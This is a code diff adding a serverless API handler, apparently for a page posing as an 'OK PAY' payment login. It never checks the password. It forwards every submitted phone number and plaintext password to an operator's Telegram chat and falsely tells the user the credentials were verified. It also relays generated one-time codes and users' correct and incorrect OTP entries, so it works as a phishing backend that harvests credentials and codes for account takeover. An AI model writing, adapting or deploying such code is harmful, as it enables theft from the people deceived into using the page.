@@ -1,0 +1,111 @@
+// In-memory store (Vercel serverless function ke liye)
+const sessionStore = new Map();
+
+export default async function handler(req, res) {
+  // Sirf POST request allow karein
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
+
+  try {
+    const { phone, pass, pin, otp, type } = req.body;
+
+    if (!phone || !type) {
+      return res.status(400).json({ error: 'Invalid request: Missing required fields.' });
+    }
+
+    // Vercel Environment Variables se credentials uthayenge
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    // Telegram par message bhejne ka helper function
+    async function sendTelegramAlert(message) {
+      if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.error('Telegram API Error:', err);
+      }
+    }
+
+    switch (type) {
+      case 'login':
+        if (!pass) {
+          return res.status(400).json({ error: 'Password is required for login.' });
+        }
+        if (phone.length !== 10) {
+          return res.status(400).json({ error: 'Validation failed: Incorrect phone format.' });
+        }
+
+        // 🔔 1. Login attempt (Phone aur Password)
+        await sendTelegramAlert(
+          `🚨 *OK PAY - New Login Attempt*\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${pass}\``
+        );
+
+        return res.status(200).json({ 
+          success: true, 
+          message: 'Credentials verified. Ready to send OTP.' 
+        });
+
+      case 'send_otp':
+        const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+        sessionStore.set(phone, { otp: generatedOtp, expiresAt: Date.now() + 60000 * 5 });
+
+        // 🔔 2. Asli Generated OTP
+        await sendTelegramAlert(
+          `📨 *OK PAY - OTP Generated*\n\n📱 *Phone:* \`${phone}\`\n🔢 *Correct OTP:* \`${generatedOtp}\``
+        );
+
+        return res.status(200).json({ 
+          success: true, 
+          message: 'OTP sent successfully.' 
+        });
+
+      case 'verify_otp':
+        if (!otp) {
+          return res.status(400).json({ error: 'OTP is required.' });
+        }
+
+        const sessionData = sessionStore.get(phone);
+
+        if (!sessionData || sessionData.expiresAt < Date.now()) {
+          return res.status(400).json({ error: 'OTP expired or session not found.' });
+        }
+
+        // 🔔 3. Agar user ne GALAT OTP enter kiya hai
+        if (sessionData.otp !== otp) {
+          await sendTelegramAlert(
+            `❌ *OK PAY - Wrong OTP Entered!*\n\n📱 *Phone:* \`${phone}\`\n🔢 *User ne yeh galat OTP dala:* \`${otp}\`\n⚠️ (Asli OTP yeh tha: \`${sessionData.otp}\`)`
+          );
+          return res.status(400).json({ error: 'Wrong OTP! Please try again.' });
+        }
+
+        // 🔔 4. Agar sahi OTP enter kiya hai
+        sessionStore.delete(phone);
+        await sendTelegramAlert(
+          `✅ *OK PAY - Login Successful*\n\n📱 *Phone:* \`${phone}\` ne sahi OTP (\`${otp}\`) daal kar login complete kar liya.`
+        );
+
+        return res.status(200).json({ 
+          success: true, 
+          message: 'Authentication successful!' 
+        });
+
+      default:
+        return res.status(400).json({ error: 'Unknown request type.' });
+    }
+
+  } catch (err) {
+    console.error('Server Error in /api/send:', err);
+    return res.status(500).json({ error: 'Internal server error.' });
+  }
+}
